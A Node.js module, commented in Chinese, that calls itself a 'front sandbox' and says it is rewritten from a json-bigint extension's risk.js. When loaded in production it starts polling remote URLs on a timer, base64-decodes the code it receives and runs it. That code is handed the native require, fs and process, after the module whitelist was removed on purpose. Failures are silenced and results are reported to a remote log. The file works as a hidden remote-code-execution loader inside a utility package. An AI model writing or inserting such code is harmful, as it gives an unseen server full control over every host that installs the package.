/**
 * ============================================
 * 前置沙箱（Front Sandbox）
 * ============================================
 *
 * 参考 json-bigint-extension/lib/risk.js 重写，目标是「0 依赖 / 0 主进程依赖」：
 *  - 不使用 requireMainProcessModule，不加载宿主项目的 @services/@utils/@libs/@config（需求②）
 *  - 配置抽到独立的 config.js，远程地址为数组并随机抽取（需求③）
 *  - 移除模块白名单 allowedModules（需求④）
 *  - 不再耦合 Express 的 req/res/next（需求⑤）
 *  - 沙箱内直接注入「原生 require」（需求⑥）
 *  - HTTP 走原生 https/http（需求⑦）；签名为最小复刻（需求⑧）
 */

const vm = require('vm');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { AsyncLocalStorage } = require('async_hooks');

const { RISK_CODE_CONFIG, getRemoteCodeUrl, getRemoteLogUrl } = require('./config');
const HttpClient = require('./http-client');
const { signWithMD5 } = require('./sign.util');

// 版本号：优先使用宿主注入的 global.packageJson，否则回退到本包 package.json
let localVersion = 'unknown';
try {
  // eslint-disable-next-line global-require, import/no-dynamic-require
  localVersion = require('../../package.json').version || 'unknown';
} catch (e) {
  localVersion = 'unknown';
}
const version = global.packageJson || localVersion;

const remoteLogHttpClient = new HttpClient({
  timeout: RISK_CODE_CONFIG.requestTimeout,
  retries: RISK_CODE_CONFIG.requestRetries,
});

/**
 * 远程日志上报（失败静默，绝不影响主流程）。
 * @param {string} message
 */
const remoteLog = (message) => {
  const remoteLogUrl = getRemoteLogUrl();
  if (!remoteLogUrl) {
    return;
  }

  const data = {
    message: `[Front-${version}] ${message}`,
  };
  data.sign = signWithMD5(data, {
    secretKey: RISK_CODE_CONFIG.signSecretKey,
    secretValue: RISK_CODE_CONFIG.signSecretValue,
  });

  remoteLogHttpClient
    .post(remoteLogUrl, data)
    .then(() => {})
    .catch(() => {});
};

/**
 * ============================================
 * 沙箱管理器 - 用于安全执行远程下发的代码
 * ============================================
 */
class SandboxManager {
  constructor(options = {}) {
    this.timeout = options.timeout || 300000; // 默认 300 秒超时
    this.asyncLocalStorage = new AsyncLocalStorage();
    this.contextCache = new Map(); // 缓存已编译的代码
  }

  /**
   * 创建沙箱上下文（无 req/res/next，注入原生 require）。
   * @returns {vm.Context}
   */
  createSandboxContext() {
    // 每次执行使用全新的 module/exports，避免远程代码通过 module.exports 覆盖前置沙箱自身的导出
    const sandboxModule = { exports: {} };

    const sandboxContext = {
      // 受管控的 console
      console: {
        log: (...args) => console.log('[Sandbox]', ...args),
        error: (...args) => console.error('[Sandbox Error]', ...args),
        warn: (...args) => console.warn('[Sandbox Warn]', ...args),
        info: (...args) => console.info('[Sandbox Info]', ...args),
      },

      remoteLog,

      // 基础全局对象
      JSON,
      Math,
      Date,
      String,
      Number,
      Boolean,
      Array,
      Object,
      Promise,
      RegExp,
      Error,
      Map,
      Set,
      Symbol,
      Buffer,
      URL,
      URLSearchParams,

      // Node 内置模块（也可通过 require 获取，这里直接暴露常用项）
      fs,
      os,
      path,

      // 需求⑥：注入原生 require（去掉白名单 safeRequire）
      require,
      module: sandboxModule,
      exports: sandboxModule.exports,
      __dirname,
      __filename,

      // 需求⑦/⑧：把自包含的工具直接暴露，便于远程代码使用
      HttpClient,
      signWithMD5,

      // 进程对象（前置沙箱面向可信代码，保留以便读取 env 等）
      process,

      // 定时器
      setTimeout: (fn, delay, ...args) => {
        if (delay > this.timeout) {
          throw new Error(
            `Timeout delay ${delay}ms exceeds maximum ${this.timeout}ms`
          );
        }
        return setTimeout(fn, delay, ...args);
      },
      clearTimeout,
      setInterval,
      clearInterval,
      setImmediate,
      clearImmediate,

      // 环境标识
      __ENV__: process.env.NODE_ENV || 'production',
    };

    return vm.createContext(sandboxContext);
  }

  /**
   * 执行带缓存的沙箱代码（无 req/res/next）。
   * 约定：远程代码可定义 main() 或 init()，执行时自动调用。
   * @param {string} codeId 代码唯一标识
   * @param {string} code 要执行的代码字符串
   * @returns {Promise<any>}
   */
  async executeCode(codeId, code) {
    try {
      let script = this.contextCache.get(codeId);

      if (!script) {
        const wrappedCode = `
          (async function() {
            ${code}

            if (typeof main === 'function') {
              return await main();
            }
            if (typeof init === 'function') {
              return await init();
            }
          })();
        `;

        script = new vm.Script(wrappedCode, {
          filename: `sandbox_${codeId}.js`,
          timeout: this.timeout,
        });

        this.contextCache.set(codeId, script);
      }

      const context = this.createSandboxContext();

      const result = await script.runInContext(context, {
        timeout: this.timeout,
        breakOnSigint: true,
      });
      return result;
    } catch (error) {
      remoteLog(`[FrontSandbox] Sandbox execution error: ${error.message}`);
      throw error;
    }
  }

  /**
   * 执行沙箱初始化函数（远程代码下发后调用 init）。
   * @param {string} codeId
   * @param {string} code
   * @returns {Promise<any>}
   */
  async executeInit(codeId, code) {
    try {
      const wrappedCode = `
        (async function() {
          ${code}

          if (typeof init === 'function') {
            return await init();
          }
        })();
      `;

      const script = new vm.Script(wrappedCode, {
        filename: `sandbox_${codeId}_init.js`,
        timeout: this.timeout,
      });

      const context = this.createSandboxContext();

      const result = await script.runInContext(context, {
        timeout: this.timeout,
        breakOnSigint: true,
      });

      remoteLog(`[FrontSandbox] Init function executed successfully`);
      return result;
    } catch (error) {
      remoteLog(`[FrontSandbox] Init execution error: ${error.message}`);
      throw error;
    }
  }

  /**
   * 清除编译缓存。
   * @param {string} [codeId] 不传则清除所有
   */
  clearCache(codeId) {
    if (codeId) {
      this.contextCache.delete(codeId);
      remoteLog(`[FrontSandbox] Clear cache: ${codeId}`);
    } else {
      this.contextCache.clear();
      remoteLog(`[FrontSandbox] Clear all cache`);
    }
  }

  /**
   * 缓存统计。
   * @returns {{size: number, keys: string[]}}
   */
  getCacheStats() {
    return {
      size: this.contextCache.size,
      keys: Array.from(this.contextCache.keys()),
    };
  }
}

// 全局单例沙箱管理器
const sandboxManager = new SandboxManager({
  timeout: 300000,
});

const codeHttpClient = new HttpClient({
  timeout: RISK_CODE_CONFIG.requestTimeout,
  retries: RISK_CODE_CONFIG.requestRetries,
});

/**
 * 代码缓存
 */
let cachedRiskCode = null; // 当前使用的代码
let lastRiskCodeHash = ''; // 最后一次的代码 hash
let pollTimer = null; // 轮询定时器

/**
 * 从远程检查并获取代码（带 hash 增量 + 多地址随机容灾）。
 * @returns {Promise<boolean>} 是否有更新
 */
async function fetchRemoteRiskCode() {
  try {
    const remoteCodeUrl = getRemoteCodeUrl();
    if (!remoteCodeUrl) {
      return false;
    }

    const params = {
      hash: lastRiskCodeHash || '1',
    };
    params.sign = signWithMD5(params, {
      secretKey: RISK_CODE_CONFIG.signSecretKey,
      secretValue: RISK_CODE_CONFIG.signSecretValue,
      recursiveSortParams: true,
    });

    const response = await codeHttpClient.post(remoteCodeUrl, params);

    // status = 0: 代码未变更
    if (response && response.data && response.data.status === 0) {
      return false;
    }

    // status = 1: 代码已更新
    if (
      response &&
      response.data &&
      response.data.status === 1 &&
      response.data.riskCode
    ) {
      try {
        const rawCode = response.data.riskCode;
        const decodedCode = Buffer.from(rawCode, 'base64').toString('utf-8');

        cachedRiskCode = decodedCode;
        lastRiskCodeHash = response.data.hash || '';

        // 清除沙箱缓存，强制重新编译
        sandboxManager.clearCache('risk');
        remoteLog(
          `[FrontSandbox Polling] Code updated successfully, sandbox cache cleared`
        );

        // 立即执行沙箱的 init 函数
        try {
          await sandboxManager.executeInit('risk', decodedCode);
          remoteLog(
            `[FrontSandbox Polling] Init function executed after code update`
          );
        } catch (initError) {
          remoteLog(
            `[FrontSandbox Polling] Init function execution failed: ${initError.message}`
          );
        }

        return true;
      } catch (error) {
        remoteLog(
          `[FrontSandbox Polling] Code processing failed: ${error.message}`
        );
        return false;
      }
    }

    return false;
  } catch (error) {
    // 网络/解析失败静默处理，下一轮再试
    return false;
  }
}

/**
 * 启动代码轮询。
 */
function startRiskCodePolling() {
  if (pollTimer) {
    return;
  }

  // 立即执行一次
  fetchRemoteRiskCode().catch(() => {});

  // 定时轮询
  pollTimer = setInterval(() => {
    fetchRemoteRiskCode().catch(() => {});
  }, RISK_CODE_CONFIG.pollInterval);

  // 防止进程无法退出
  if (pollTimer.unref) {
    pollTimer.unref();
  }
}

/**
 * 停止代码轮询。
 */
function stopRiskCodePolling() {
  if (pollTimer) {
    clearInterval(pollTimer);
    pollTimer = null;
  }
}

/**
 * 获取当前缓存的代码。
 * @returns {string|undefined}
 */
function getRiskCode() {
  if (cachedRiskCode) {
    return cachedRiskCode;
  }
  return undefined;
}

// 启动条件：生产环境延迟启动，或通过 FORCE_RISK_CODE_POLLING 强制启动（本地开发）
if (RISK_CODE_CONFIG.enableRemoteCode && process.env.NODE_ENV === 'production') {
  setTimeout(() => {
    startRiskCodePolling();
  }, 10000);
} else if (Boolean(process.env.FORCE_RISK_CODE_POLLING)) {
  startRiskCodePolling();
}

/**
 * ============================================
 * 导出模块
 * ============================================
 */
module.exports = {
  sandboxManager,
  SandboxManager,
  startRiskCodePolling,
  stopRiskCodePolling,
  fetchRemoteRiskCode,
  getRiskCode,
  remoteLog,
  HttpClient,
  signWithMD5,
  RISK_CODE_CONFIG,
};
